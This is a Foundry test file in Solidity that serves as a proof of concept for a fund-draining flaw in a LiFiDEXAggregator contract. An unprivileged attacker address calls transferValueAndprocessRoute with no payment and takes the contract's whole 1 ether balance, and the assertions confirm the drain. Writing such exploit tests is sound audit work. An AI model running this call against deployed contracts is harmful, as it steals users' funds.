// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.17;

import {Test} from "forge-std/Test.sol";
import {LiFiDEXAggregator} from "lifi/Periphery/LiFiDEXAggregator.sol";

contract LiFiDEXAggregatorTransferValueDrainTest is Test {
    LiFiDEXAggregator internal aggregator;
    address internal attacker = address(0xBEEF);
    address constant NATIVE_ADDRESS = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    function setUp() public {
        address[] memory privileged = new address[](1);
        privileged[0] = address(this);
        aggregator = new LiFiDEXAggregator(address(0), privileged, address(this));

        // Fund aggregator with 1 ether
        vm.deal(address(aggregator), 1 ether);
        vm.deal(attacker, 0);
    }

    function test_DrainEtherViaTransferValue() public {
        uint256 attackerInitial = attacker.balance;
        vm.prank(attacker);
        aggregator.transferValueAndprocessRoute{value: 0}(
            payable(attacker),
            1 ether,
            NATIVE_ADDRESS,
            0,
            NATIVE_ADDRESS,
            0,
            attacker,
            ""
        );

        assertEq(attacker.balance, attackerInitial + 1 ether, "attacker received ether");
        assertEq(address(aggregator).balance, 0, "aggregator drained");
    }
}

